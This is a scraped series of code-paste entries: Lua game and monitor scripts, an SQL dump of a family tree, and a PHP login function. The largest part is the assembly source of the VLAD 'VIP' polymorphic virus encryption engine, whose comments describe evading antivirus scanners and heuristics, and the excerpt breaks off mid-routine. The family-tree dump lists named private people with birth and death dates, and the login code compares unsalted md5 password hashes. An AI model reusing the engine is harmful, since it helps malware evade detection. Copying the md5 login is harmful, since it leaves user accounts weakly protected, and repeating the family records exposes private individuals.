		insertLootEntry(spawnedItems, lootEntry)--create spawned item object from entry and insert it in array
	end
	
	local randChance, totalChance --declare variables once to reduce cpu usage
	
	for entryGroupId, lootEntries in pairs(entryGroups) do
		randChance = math.random()--get number between 0 and 1
		totalChance = 0
		
		for _, lootEntry in pairs(lootEntries) do
			totalChance += lootEntry.chance -- counter variable used to keep track of the chance slice we're currently in
			
			if totalChance > randChance then -- check if the rand number is inside the current slice
				insertLootEntry(spawnedItems, lootEntry)--if so spawn item and break this inner loop
				
				break
			end
		end
	end
	
	return spawnedItems
end

local function spawnLoot(tableId : string, pos : Vector3)--Function to spawn loot table at pos
	local lootTable = lootTables[tableId]
	
	if lootTable then
		for _, spawnedItem in pairs(calculateLootSpawn(lootTable)) do
			for i=1, spawnedItem.quantity do-- call function {quantity} times giving it the position to spawn the item at and the item to spawn
				spawnItem(spawnedItem.item, pos)
			end
		end
	end
end

--//Events\\

replicatedStorage.SpawnLootTable.Event:Connect(spawnLoot)--Event to fire to spawn loot"
33Ap4Vje,Untitled,herhor67,MySQL,Sunday 19th of November 2023 07:38:38 AM CDT,"-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Nov 18, 2023 at 08:28 PM
-- Server version: 10.3.39-MariaDB-log
-- PHP Version: 8.1.16

SET SQL_MODE = ""NO_AUTO_VALUE_ON_ZERO"";
START TRANSACTION;
SET time_zone = ""+00:00"";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `herhor67vi_herhornet`
--

-- --------------------------------------------------------

--
-- Table structure for table `drzewo_ludzie`
--

CREATE TABLE `drzewo_ludzie` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL DEFAULT '',
  `sex` enum('u','m','f') NOT NULL DEFAULT 'u',
  `born` date DEFAULT NULL,
  `died` date DEFAULT NULL,
  `desc` text NOT NULL DEFAULT '',
  `family` int(10) UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Truncate table before insert `drzewo_ludzie`
--

TRUNCATE TABLE `drzewo_ludzie`;
--
-- Dumping data for table `drzewo_ludzie`
--

INSERT INTO `drzewo_ludzie` (`id`, `name`, `sex`, `born`, `died`, `desc`, `family`) VALUES
(1, 'Dawid Najda', 'm', '1999-12-28', NULL, '', 1),
(2, 'Sławomir Najda', 'm', '1967-03-19', NULL, '', NULL),
(3, 'Lucyna Najda', 'f', '1967-10-05', NULL, '', NULL),
(4, 'Emil Habarta', 'm', NULL, NULL, '', NULL),
(5, 'Krystyna Habarta', 'f', '1948-10-02', '2019-12-31', '', NULL),
(6, 'Anna Wisełka', 'f', NULL, NULL, '', NULL),
(7, 'Katarzyna Habarta', 'f', NULL, NULL, '', NULL),
(8, 'Joanna Niemczyk', 'f', NULL, NULL, '', NULL),
(9, 'Jan Habarta', 'm', NULL, NULL, '', NULL),
(10, 'Anna Habarta', 'f', NULL, NULL, '', NULL),
(11, 'Jan Nowak', 'm', '1925-04-05', '1956-05-03', '', NULL),
(12, 'Anna Nowak', 'f', '1929-06-23', '2013-03-21', '', NULL),
(13, 'Lubomir Najda', 'm', '1941-07-30', '2005-10-15', '', NULL),
(14, 'Wanda Zając', 'f', NULL, NULL, '', NULL),
(15, 'Andrzej Zając', 'm', '2019-01-05', NULL, '', NULL),
(16, 'Wiesław Wisełka', 'm', NULL, NULL, '', NULL),
(17, 'Piotr Najda', 'm', NULL, NULL, '', NULL),
(18, 'Małgorzata Najda', 'f', NULL, NULL, '', NULL),
(19, 'Kamila Najda', 'f', NULL, NULL, '', NULL),
(20, 'Katarzyna Najda', 'f', NULL, NULL, '', NULL),
(21, 'Jan Wissner', 'm', '1903-12-25', NULL, '', NULL),
(22, 'Maria Wissner', 'f', '1903-08-03', NULL, '', NULL),
(23, 'Janina Chwistek', 'f', NULL, NULL, '', NULL),
(24, 'Julian Najda', 'm', '1909-10-14', '1993-05-02', '', NULL),
(25, 'Eugenia Najda', 'f', '1906-02-13', '1970-04-15', '', NULL),
(26, 'Dominik Górniok', 'm', NULL, NULL, '', NULL),
(27, 'Julia Górniok', 'f', '1904-03-04', '1986-07-12', '', NULL),
(28, 'Jan Nowak', 'm', '1892-11-08', '1948-08-22', '', NULL),
(29, 'Zuzanna Nowak', 'f', NULL, NULL, '', NULL),
(30, 'Jan Warcenga', 'm', NULL, NULL, '', NULL),
(31, 'Elżbieta Warcenga', 'f', NULL, NULL, '', NULL),
(32, 'Daniel Niemczyk', 'm', NULL, NULL, '', NULL),
(33, 'Jarosław Niemczyk', 'm', NULL, NULL, '', NULL),
(34, 'Stefan Chwistek', 'm', NULL, NULL, '', NULL),
(35, 'Zofia Chrapek', 'f', NULL, NULL, '', NULL),
(36, 'Janina Brudny', 'f', NULL, NULL, '', NULL),
(37, 'Stanisław Chrapek', 'm', NULL, NULL, '', NULL),
(38, 'Alfred Brudny', 'm', NULL, NULL, '', NULL),
(39, 'Bazyli Najda', 'm', '1882-06-02', '1960-11-09', '', NULL),
(40, 'Maria Najda', 'f', '1886-04-07', '1958-04-27', '', NULL),
(41, 'Orest Najda', 'm', '1936-07-02', '2007-12-13', '', NULL),
(42, 'Elżbieta Najda', 'f', '1938-11-13', '2013-04-01', '', NULL),
(43, 'Robert Najda', 'm', '1995-11-23', '1995-12-13', '', NULL),
(44, 'Aleksy Górniok', 'm', '1932-10-23', '1982-07-28', '', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `drzewo_relacje`
--

CREATE TABLE `drzewo_relacje` (
  `id` int(10) UNSIGNED NOT NULL,
  `mom` int(10) UNSIGNED DEFAULT NULL,
  `dad` int(10) UNSIGNED DEFAULT NULL,
  `date` date DEFAULT NULL,
  `desc` text NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Truncate table before insert `drzewo_relacje`
--

TRUNCATE TABLE `drzewo_relacje`;
--
-- Dumping data for table `drzewo_relacje`
--

INSERT INTO `drzewo_relacje` (`id`, `mom`, `dad`, `date`, `desc`) VALUES
(1, 2, 3, NULL, 'Rodzice');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `drzewo_ludzie`
--
ALTER TABLE `drzewo_ludzie`
  ADD PRIMARY KEY (`id`),
  ADD KEY `family_fk` (`family`);

--
-- Indexes for table `drzewo_relacje`
--
ALTER TABLE `drzewo_relacje`
  ADD PRIMARY KEY (`id`),
  ADD KEY `mom_fk` (`mom`),
  ADD KEY `dad_fk` (`dad`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `drzewo_ludzie`
--
ALTER TABLE `drzewo_ludzie`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT for table `drzewo_relacje`
--
ALTER TABLE `drzewo_relacje`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `drzewo_ludzie`
--
ALTER TABLE `drzewo_ludzie`
  ADD CONSTRAINT `drzewo_ludzie_family_fk` FOREIGN KEY (`family`) REFERENCES `drzewo_relacje` (`id`) ON DELETE SET NULL ON UPDATE SET NULL;

--
-- Constraints for table `drzewo_relacje`
--
ALTER TABLE `drzewo_relacje`
  ADD CONSTRAINT `drzewo_relacje_dad_fk` FOREIGN KEY (`dad`) REFERENCES `drzewo_ludzie` (`id`) ON DELETE SET NULL ON UPDATE SET NULL,
  ADD CONSTRAINT `drzewo_relacje_mom_fk` FOREIGN KEY (`mom`) REFERENCES `drzewo_ludzie` (`id`) ON DELETE SET NULL ON UPDATE SET NULL;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
"
qGTDGQY0,邀您一起看：凤凰错:专宠弃,xiaomianao666,JavaScript,Sunday 19th of November 2023 07:24:16 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥凤凰错:专宠弃@@
JaAUix0H,staple,Geniusum,Lua,Sunday 19th of November 2023 06:57:45 AM CDT,"---@diagnostic disable: duplicate-set-field
-- Modern recreation of stitch
-- This can be used as a library or as a command-line tool
-- Scrolling requires buffering to be enabled, pass layout.buffer = true
-- This significantly slows down staple, enabling literally just wraps staple in a window

local function getNative()
    local i = 1
    while true do
        local n, v = debug.getupvalue(peripheral.call, i)
        if not n then break end
        if n == ""native"" then return v end
        i = i + 1
    end
    error(""peripheral.call has been overwritten!"")
end


local native = getNative()
local function fastwrap(side)
    local periph = peripheral.wrap(side) --[[@as table]]
    for k,v in pairs({peripheral.find(""modem"", function (name, wrapped)
        return not wrapped.isWireless()
    end)}) do
        if v.isPresentRemote(side) then
            local wrapped = {}
            for method, _ in pairs(periph) do
                wrapped[method] = function(...)
                    return native.call(peripheral.getName(v), ""callRemote"", side, method, ...)
                end
            end
            return wrapped
        end
    end
    error((""Peripheral %s not found.""):format(side))
end

---Create a new Stapled term object
---@param layout string[][]
---@return Monitor|Window
local function staple(layout)
    local cursorx, cursory = 1, 1
    local w, h
    local fg, bg = colors.white, colors.black
    ---@type Monitor[][]
    local monitors = {}

    ---@type {w:integer,h:integer,x:integer,y:integer}[][]
    local monitorInfo = {}
    ---@param fun fun(x: integer, y: integer, mon: Monitor)
    local function runOnAll(fun)
        for y, row in ipairs(monitors) do
            for x, mon in ipairs(row) do
                fun(x,y,mon)
            end
        end
    end

    local function updateSize()
        -- update all monitors
        for y, row in ipairs(layout) do
            monitors[y] = {}
            for x, mon in ipairs(row) do
                monitors[y][x] = fastwrap(mon) --[[@as Monitor]]
            end
        end
        w = 0
        h = 0
        runOnAll(function (x, y, mon)
            monitorInfo[y] = monitorInfo[y] or {}
            local monW, monH = mon.getSize()
            local monX, monY = 1,1
            if x > 1 then
                -- not the leftmost monitor
                local leftMonitor = monitorInfo[y][x-1]
                monX = leftMonitor.x + leftMonitor.w
            else
                h = h + monH
            end
            if y > 1 then
                -- not the topmost monitor
                local topMonitor = monitorInfo[y-1][x]
                monY = topMonitor.y + topMonitor.h
            else
                w = w + monW
            end
            monitorInfo[y][x] = {w=monW,h=monH,x=monX,y=monY}
        end)
    end
    updateSize()

    ---@param name string
    ---@param ... any
    local function callOnAll(name, ...)
        local args = table.pack(...)
        local val
        runOnAll(function (x, y, mon)
            -- if val then
            --     return
            -- end
            local success
            success, val = pcall(mon[name], table.unpack(args, 1, args.n))
            if not success then
                error((""Called %s, Errored %s""):format(name,val))
            end
        end)
        return val
    end

    ---@type Window
    local monEmu = {}

    for k,_ in pairs(monitors[1][1]) do -- allow access to window methods
        monEmu[k] = function(...)
            return callOnAll(k, ...)
        end
    end

    function monEmu.setCursorPos(x,y)
        cursorx = x
        cursory = y
        runOnAll(function (mx, my, mon)
            local monInfo = monitorInfo[my][mx]
            mon.setCursorPos(x-monInfo.x+1,y-monInfo.y+1)
        end)
    end

    function monEmu.blit(text, textColor, backgroundColor)
        runOnAll(function (x, y, mon)
            mon.blit(text, textColor, backgroundColor)
        end)
        cursorx = cursorx + #text
    end

    function monEmu.getCursorPos()
        return cursorx, cursory
    end

    function monEmu.getSize()
        return w, h
    end

    function monEmu.write(text)
        runOnAll(function (x, y, mon)
            mon.write(text)
        end)
        cursorx = cursorx + #text
    end

    function monEmu.getPaletteColor(col)
        return monitors[1][1].getPaletteColor(col)
    end
    monEmu.getPaletteColour = monEmu.getPaletteColor

    monEmu.setCursorPos(1,1)

    function monEmu.setTextScale(scale)
        for yp, row in ipairs(monitors) do
            for xp, win in ipairs(row) do
                win.setTextScale(scale)
            end
        end
        updateSize()
    end

    function monEmu.scroll(y)
        error(""Staple needs to be buffered for scrolling to work."")
    end

    local win = monEmu
    if layout.buffer then
        win = window.create(monEmu, 1, 1, w, h)
        function win.setTextScale(scale)
            monEmu.setTextScale(scale)
            win.reposition(1,1,w,h)
        end
    end
    return win
end

---Load a stapled term object from a file
---@param filename string
---@return Monitor|Window
local function loadStaple(filename)
    local f = assert(fs.open(filename, ""r""))
    local d = assert(textutils.unserialise(f.readAll() --[[@as string]]), ""Invalid file."") --[[@as table]]
    f.close()
    return staple(d)
end

local function runProgram(side, monitor, filename, args)
    local env = setmetatable({peripheral = setmetatable({}, {__index=_ENV.peripheral})}, {__index=_ENV})
    local oldWrap = peripheral.wrap
    env.peripheral.wrap = function (s)
        if s == side then
            return monitor
        end
        return oldWrap(s)
    end
    loadfile(filename, ""t"", env)(table.unpack(args, 1, args.n))
end

local args = {...}
local argsLookup = {
    setup = function ()
        if #args < 4 then
            print(""Usage: staple setup <width> <height> <filename> [buffer?]"")
            return
        end
        local w = assert(tonumber(args[2]), help)
        local h = assert(tonumber(args[3]), help)
        local f = assert(fs.open(args[4], ""w""))
        local monitors = {}
        print(""Touch the monitors in order, from top left to bottom right."")
        for y = 1, h do
            monitors[y] = {}
            for x = 1, w do
                local _, side, _, _ = os.pullEvent(""monitor_touch"")
                local mon = peripheral.wrap(side) --[[@as Monitor]]
                local info = (""%s attached at (%u,%u)""):format(side, x, y)
                print(info)
                monitors[y][x] = side
                mon.setTextScale(1)
                local mw, mh = mon.getSize()
                mon.setTextScale(mw / (#info * 1.25))
                mw, mh = mon.getSize()
                mon.setBackgroundColor(2^((x+(y*w)) % 15))
                mon.clear()
                mon.setCursorPos((mw-#info)/2, mh/2)
                mon.write(info)
            end
        end
        monitors.buffer = not not args[5]
        f.write(textutils.serialise(monitors))
        f.close()
    end,
    load = function ()
        if #args < 4 then
            print(""Usage: staple load <filename> <side> <program_filename> <args...>"")
            return
        end
        local stapled = loadStaple(args[2])
        runProgram(args[3], stapled, args[4], table.pack(table.unpack(args, 5, args.n)))
    end,
    redirect = function ()
        if #args < 3 then
            print(""Usage: staple redirect <filename> <program>"")
            return
        end
        local stapled = loadStaple(args[2])
        term.redirect(stapled)
        shell.run(args[3])
    end
}

if #args == 2 and type(package.loaded[args[1]]) == ""table"" and not next(package.loaded[args[1]]) then
    return {
        staple = staple,
        load = loadStaple,
    }
end

-- running from commandline
if #args < 1 or not argsLookup[args[1]] then
    print(""Usage:"")
    for k,v in pairs(argsLookup) do
        print(""staple"",k)
    end
    return
end
return argsLookup[args[1]]()"
z8CfjwTz,Untitled,azkya,MySQL,Sunday 19th of November 2023 06:46:42 AM CDT,"    public function login()
    {
        $user = $this->Users->newEmptyEntity();
        if ($this->request->is('post', 'get')) {
            $param = $this->request->getData();
            $password = $param['password'];
            $query = $this->Users->find()
                ->where(['email' => $param['email'], 'password' => md5($password)])
                ->first();
            if (empty($query)) {
                $this->Flash->error(__(""Login Gagal.""));

                return $this->redirect(['action' => 'login']);
            }
            $this->Flash->success(__('Login Succes.'));
            return $this->redirect(['controller' => 'customers', 'action' => 'index']);
        }
        $this->set(compact('user'));
    }"
mS0hTMwp,multimonitor.lua,Geniusum,Lua,Sunday 19th of November 2023 06:37:25 AM CDT,"-- Liste des adresses des moniteurs
local moniteurs = {""monitor_9"", ""monitor_10"", ""monitor_11"", ""monitor_12"", ""monitor_13"", ""monitor_14""}

-- Charger l'image .nfp
local image = paintutils.loadImage(""chemin_vers_votre_image.nfp"")

-- Taille des moniteurs
local largeurMoniteur = 8
local hauteurMoniteur = 6

-- Diviser l'image en sections
local sections = {}
for y = 1, #moniteurs * hauteurMoniteur, hauteurMoniteur do
    for x = 1, #moniteurs * largeurMoniteur, largeurMoniteur do
        local section = {}
        for i = 1, hauteurMoniteur do
            section[i] = string.sub(image[y + i - 1], x, x + largeurMoniteur - 1)
        end
        table.insert(sections, section)
    end
end

-- Afficher sur les moniteurs
for i, adresse in ipairs(moniteurs) do
    local moniteur = peripheral.wrap(adresse)
    term.redirect(moniteur)
    moniteur.clear()
    moniteur.setTextScale(0.5)

    for _, section in ipairs(sections) do
        for _, ligne in ipairs(section) do
            print(ligne)
        end
    end

    term.redirect(term.native())
end"
xAEmy18F,VLAD Magazine - Issue #6 - ARTICLE.4_3 -  VLAD Infinite Polymorphic - VIP,FlyFar,ASM (NASM),Sunday 19th of November 2023 06:21:37 AM CDT,";
;               VLAD Infinite Polymorphic - VIP
;               by Qark - VLAD
;
; This engine is good in some respects, and poor in others.
; The encryption it creates is fairly easy to crack, being a looping
; xor with a keychange (all registers/values chosen at random),
; but the encryption loops are very hard to detect.  There are four
; different loop types, of which TBSCAN can only find two.
;
; At the start of the decryptor, the engine won't produce some instructions
; that flag heuristics.  For this reason, VIP avoids alot of the heuristic
; problems most other garbage generators have.  For example:
;  Doesn't produce INC/DEC in the first 20 bytes to avoid flags.
;  Doesn't produce memory operations in the first 10 bytes.
;  Doesn't produce XCHG in the first 10 bytes.
;  Always uses the short version of instructions (AX/AL Imm etc)
;
; One problem that couldn't be avoided is the creation of FFFF word pointers
; causing crashes.  The likelihood of them occurring is low (about 1 in 300
; samples) because danger instructions have been put to a minimum. 
; (eg mov ax,[bx-1] bx=0, isn't produced anymore).
;
; If you're wondering why the polymorphism produced isn't changing, that's
; because it's an example of slow polymorphism.
;
; To assemble, use it as an include file for the program that calls it.
;


VIP:
;On entry:
;       AL    = 1 if COM file
;       DS:SI = Points to the unencrypted virus
;       ES:DI = Place to store encrypted virus
;       CX    = length of virus
;       BP    = delta offset
;    Assumes CS=DS=ES
;On return:
;       CX    = length of decryptor + encrypted code

        cld
        mov     word ptr saved_cx,cx
        mov     word ptr saved_di,di
        mov     word ptr saved_si,si
        mov     byte ptr segtype,al
        mov     byte ptr inloop,0               ;Initialise variable

        ;Initialise our randomisation for slow polymorphism.
        call    init_rand

        ;Clear the register table

        call    unmark_all

        ;Clear the displacements
        call    clear_displacement

        ;Select a random decryption type.
rand_routine:
        call    get_rand
        mov     si,offset dec_type
        and     ax,3*2
        add     si,ax
        mov     ax,word ptr [si]
        jmp     ax

Standard:
;Uses 'standard' encryption.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       xor     word ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+virlength
;       jne     loop
;     virus_start:
; -----------------------------------------------

        call    startup                 ;Setup pointer and cipher

        mov     byte ptr inloop,1
        mov     word ptr loopstart,di

        call    encrypt_type

        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne              ;JNE xx
        call    calc_jne

        mov     byte ptr inloop,0

        ;Calculate the displacement
        call    fix_displacements

        call    encrypt_virus

        call    decryptor_size

        ret

Stack1:
;Use the stack method for encryption.  This method doesnt work on EXE's
;because SS <> CS.
; ----This is a basic layout of the decryptor----
;       mov     sp,offset virus_start
;       mov     cipher,xor_val
;     loop:
;       pop     reg
;       xor     reg,cipher
;       push    reg
;       pop     randomreg
;       cmp     sp,virus_start+virus_length
;       jne     loop
; -----------------------------------------------

        cmp     byte ptr segtype,0
        jne     stack1_ok
        jmp     rand_routine
stack1_ok:
        call    rand_garbage
        call    rand_garbage
        mov     al,0bch         ;MOV SP,xxxx
        stosb
        mov     word ptr displace,di
        mov     ax,bp
        stosw

        call    setup_cipher
        
        mov     byte ptr inloop,1
        mov     word ptr loopstart,di

        call    select_reg
        call    rand_garbage
        push    ax
        or      al,58h                  ;POP reg
        stosb
        call    rand_garbage

        mov     al,33h                  ;XOR reg,reg
        stosb

        pop     ax
        push    ax
        push    cx
        mov     cl,3
        shl     al,3
        or      al,byte ptr cipher
        or      al,0c0h
        stosb
        pop     cx

        call    rand_garbage
        
        pop     ax
        or      al,50h          ;PUSH reg
        stosb

        call    rand_garbage
next_pop:
        call    get_rand
        call    check_reg
        jc      next_pop
        and     al,7
        or      al,58h          ;POP reg  (=add sp,2)
        stosb
        
        call    rand_garbage

        mov     ax,0fc81h               ;CMP SP,xxxx
        stosw
        mov     word ptr displace2,di
        
        call    round_up
        add     ax,bp
        stosw

        call    handle_jne
        call    calc_jne

        mov     byte ptr inloop,0

        mov     al,0bch         ;mov sp,0fffeh
        stosb
        mov     ax,0fffeh
        stosw

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements

        mov     si,word ptr saved_si
        mov     cx,word ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,word ptr xorval
enc_stack1:
        lodsw
        xor     ax,bx
        stosw
        loop    enc_stack1

        call    decryptor_size

        ret

Call_Enc:
;Uses recursive calls to decrypt the virus.  Needs a big stack or else it will
;crash.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       cmp     pointer,virus_start+virus_length
;       jne     small_dec
;       ret
;     small_dec:
;       xor     word ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       call    loop
;       add     sp,virus_length-2
; -----------------------------------------------

        call    startup
        
        mov     byte ptr inloop,1

        mov     word ptr loopback,di
        call    rand_garbage

        mov     al,byte ptr pointer
        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw
        
        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne

        mov     word ptr loopf,di
        stosb

        call    rand_garbage

        mov     al,0c3h                 ;RET
        stosb
        
        call    rand_garbage

        mov     ax,di                   ;Fix the JNE.
        mov     si,word ptr loopf
        inc     si
        sub     ax,si
        dec     si
        mov     byte ptr [si],al
        
        call    encrypt_type

        mov     al,0e8h                 ;CALL xxxx
        stosb
        mov     ax,di
        inc     ax
        inc     ax
        sub     ax,word ptr loopback
        neg     ax
        stosw

        mov     byte ptr inloop,0

        call    rand_garbage

        mov     ax,0c481h
        stosw
        mov     ax,word ptr saved_cx
        dec     ax
        dec     ax
        stosw

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        
        call    encrypt_virus
        
        call    decryptor_size

        ret

Call_Enc2:
;Decrypts the virus from within a call.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;       call    decrypt
;       jmp     short virus_start
;     decrypt:
;       xor     pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+viruslength
;       jne     decrypt
;       ret
; -----------------------------------------------

        call    startup

        mov     byte ptr inloop,1

        mov     al,0e8h                 ;CALL xxxx
        stosb
        stosw
        mov     word ptr loopf16,di
        
        call    rand_garbage

        mov     al,0e9h                 ;JMP xxxx
        stosb
        mov     word ptr displace2,di
;        mov     ax,di
;        inc     ax
;        inc     ax
;        sub     ax,saved_di
;        neg     ax
        stosw

        call    rand_garbage
        call    rand_garbage

        mov     ax,di
        mov     si,word ptr loopf16
        sub     ax,si
        mov     word ptr [si-2],ax

        mov     word ptr loopstart,di

        call    encrypt_type
        
        or      al,0f8h
        mov     ah,al
        mov     al,81h          ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne
        call    calc_jne

        mov     al,0c3h                 ;ret
        stosb

        mov     byte ptr inloop,0

        call    rand_garbage

        mov     ax,di
        mov     si,word ptr displace2
        sub     ax,si
        dec     ax
        dec     ax
        mov     [si],ax
        mov     word ptr displace2,0

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        
        call    encrypt_virus
        
        call    decryptor_size

        ret

        db      'VIP V1.0 by Qark/VLAD'


;All the different encryption types
dec_type        dw      offset stack1
                dw      offset call_enc
                dw      offset call_enc2
                dw      offset standard

segtype         db      0       ;1 if com file
saved_cx        dw      0       ;the initial CX
saved_di        dw      0       ;the initial DI
saved_si        dw      0

displace        dw      0
displace2       dw      0
                dw      0

displaceb       dw      0

inloop          db      0       ;=1 if inside a loop else 0
                                ;if set no 'word ptr' instructions made
loopstart       dw      0       ;for backwards 8 bit
loopf           dw      0       ;for forwards 8 bit
loopback        dw      0       ;backwards 16 bit
loopf16         dw      0       ;forwards 16 bit
xorval          dw      0

cipher          db      0

r_m             db      0       ;The r-m of the pointer

;�������������������������������������������������������
;General routines, used universally
;�������������������������������������������������������
Check_Reg:
;Returns a carry if the register in lower 3 bits of al is bad
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        cmp     byte ptr [si],0
        pop     si
        pop     ax
        je      ok_reg
        stc
        ret
ok_reg:
        clc
        ret
        ;       ax,cx,dx,bx,sp,bp,si,di
reg     db      00,00,00,00,01,00,00,00

Mark_Reg:
;Mark a register as used, AL=reg
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        mov     byte ptr [si],1
        pop     si
        pop     ax
        ret

UnMark_All:
;Clears the register table, and sets SP
        push    ax
        push    di
        push    cx
        mov     di,offset reg
        mov     al,0
        mov     cx,8
        cs:
        rep     stosb
        mov     byte ptr cs:[reg+4],1      ;set sp
        pop     cx
        pop     di
        pop     ax
        ret

Clear_Displacement:
;Clears all the displacement variables
        push    di
        push    ax
        mov     di,offset displace
        xor     ax,ax
        stosw
        stosw
        stosw
        stosw
        stosw
        pop     ax
        pop     di
        ret

Select_Pointer:
;Select an r-m as a pointer, you must call this routine before reserving
;any registers.  Updates the variable r_m.
        push    ax
        push    si
        call    get_rand
        and     ax,7
        mov     byte ptr r_m,al

        call    index_2_pointer
        mov     al,byte ptr [si]
        call    mark_reg
        inc     si
        mov     al,byte ptr [si]
        cmp     al,0
        je      no_pointer2
        call    mark_reg
no_pointer2:
        pop     si
        pop     ax
        ret

Setup_Pointer:
;Sets up the registers specified in the r-m with random values.  These
;values are put into the variable 'pointval'.
;Moves the instructions into ES:DI.
        push    ax
        push    si

        call    rand_garbage

        call    index_2_pointer
        mov     al,byte ptr [si]
        mov     byte ptr pointer,al
        or      al,0b8h                 ;MOV REG,xxxx
        stosb
        call    get_rand
        stosw
        mov     word ptr pointval,ax
        mov     word ptr pointer1val,ax

        call    rand_garbage

        mov     al,byte ptr [si+1]
        cmp     al,0
        je      no_setupp2

        or      al,0b8h                 ;MOV REG,xxxx
        stosb

        call    get_rand
        stosw
        add     word ptr pointval,ax

        call    rand_garbage

no_setupp2:

        pop     si
        pop     ax
        ret

Index_2_Pointer:
;Sets SI to the 'pointers' table of the r_m
        push    ax
        xor     ax,ax
        mov     al,byte ptr r_m
        shl     ax,1
        mov     si,offset pointers
        add     si,ax
        pop     ax
        ret

pointer         db      0               ;the first register
pointer1val     dw      0               ;the value of the first register
pointval        dw      0
Pointers        db      3,6     ;[bx+si]
                db      3,7     ;[bx+di]
                db      5,6     ;[bp+si]
                db      5,7     ;[bp+di]
                db      6,0     ;[si]
                db      7,0     ;[di]
                db      5,0     ;[bp]
                db      3,0     ;[bx]

Select_Reg:
;Reserves a random register, and passes it out in AL
;AH is destroyed
        call    get_rand
        call    check_reg
        jc      select_reg
        and     al,7
        call    mark_reg
        ret

Setup_Reg:
;Puts the value specified in BX, into the register specified in AL.
;-Needs Fixing- to add a possible SUB, and also the garbage generation needs
;to produce the same add/sub opcodes.

        push    ax
        push    bx

        call    rand_garbage

        and     al,7
        push    ax
        or      al,0b8h         ;MOV reg,xxxx
        stosb
        
        call    get_rand

        sub     bx,ax
        stosw

        call    rand_garbage

        pop     ax
        cmp     al,0
        jne     long_addreg
        mov     al,5            ;ADD AX,xxxx
        stosb
        jmp     short finish_add
long_addreg:
        or      al,0c0h
        mov     ah,al
        mov     al,81h
        stosw                   ;ADD reg,xxxx
finish_add:
        mov     ax,bx
        stosw
        
        call    rand_garbage

        pop     bx
        pop     ax
        ret

Seg_Override:
;Puts the correct segment before a memory write.  The memory write must be
;called immediately afterwards.
        push    ax
        cmp     byte ptr segtype,1
        je      no_segset
        mov     al,2eh          ;CS:
        stosb
no_segset:
        pop     ax
        ret

Fix_Pointer:
;Fixes up the mod/rm field of a pointer instruction.  Before this routine
;is called, the opcode field has already been stosb'd. eg for xor, 31h has
;been put into the current es:[di-1].
;on entry AL=register
;The displacement field (the following 2 bytes) must be fixed up manually.

        push    ax
        push    bx
        push    cx

        mov     cl,3
        shl     al,cl
        or      al,byte ptr r_m
        or      al,80h
        stosb

        pop     cx
        pop     bx
        pop     ax
        ret

Dec_Inc_Reg:
;Inc/Dec's the reg in AL. AH= 0=inc 1=dec
;No garbage generators are called in this routine, because the flags
;may be important.
        push    ax
        mov     byte ptr dec_inc,ah
        call    get_rand
        test    al,1
        pop     ax
        push    ax
        jnz     do_inc_dec
        cmp     al,0            ;check for ax
        jne     not_ax_incdec
        mov     ax,0ff05h       ;ADD AX,ffff  = DEC AX
        cmp     byte ptr dec_inc,0
        jne     fdec1
        mov     al,2dh          ;SUB
fdec1:
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        ret
not_ax_incdec:
        cmp     byte ptr dec_inc,0
        je      fdec2
        or      al,0c0h
        jmp     short fdec3
fdec2:
        or      al,0e8h
fdec3:
        mov     ah,al
        mov     al,83h          ;ADD reg,ffff = DEC reg
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        ret
do_inc_dec:
        or      al,40h          ;INC reg
        cmp     byte ptr dec_inc,0
        je      fdec4
        or      al,8
fdec4:
        stosb
        pop     ax
        ret
dec_inc db      0               ;0=inc 1=dec

Round_Up:
;Rounds up the number in saved_cx to the nearest 2 and passes it out in AX.
        mov     ax,word ptr saved_cx
        inc     ax
        shr     ax,1
        shl     ax,1
